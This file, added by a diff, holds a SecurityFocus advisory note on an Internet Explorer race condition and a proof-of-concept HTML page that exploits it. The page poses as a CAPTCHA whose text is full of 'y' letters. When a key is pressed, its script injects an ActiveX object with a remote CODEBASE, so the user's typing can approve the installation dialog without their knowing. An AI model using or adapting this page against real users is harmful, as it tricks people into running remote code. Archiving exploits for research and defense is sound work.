@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/17713/info
+
+Internet Explorer is prone to a remote code-execution vulnerability through exploiting a race-condition when displaying modal security dialog boxes.
+
+This issue may be exploited to cause users to inadvertently allow remote-code to be executed.
+
+
+<HEAD>
+<TITLE>Internet Explorer ActiveX Installation Vulnerability</TITLE>
+</HEAD>
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
+<SCRIPT>
+
+function doInstallControl() {
+
+	document.body.innerHTML +=
+		"<OBJECT CLASSID=\"clsid:928626A3-6B98-11CF-90B4-00AA00A4011F\" TYPE=\"application/x-oleobject\" CODEBASE=\"http://activex.microsoft.com/activex/controls/museum/MSSurVid.cab#Version=1,2,0,7\" WIDTH=\"325\" HEIGHT=\"250\">\r\n" +
+            	"<PARAM NAME=\"SurroundRect\" VALUE=\"0,0,325,250\">\r\n" +
+            	"<PARAM NAME=\"Image\" VALUE=\"ritetree.jpg\">\r\n" +
+          	"</OBJECT>";
+
+	document.getElementById("captcha").focus();
+}
+
+function doWaitEntry() {
+
+	if (event.keyCode == 78 || event.keyCode == 110) {
+		doInstallControl();
+	}
+
+}
+
+</SCRIPT>
+
+<FORM ACTION="" METHOD="GET">
+Please enter the text you see on the left:<BR><BR>
+
+<B>on3l1y6y8y5y</B> <INPUT TYPE="text" ID="captcha" ONKEYPRESS="doWaitEntry()">
+
+</FORM>
+
+</BODY>
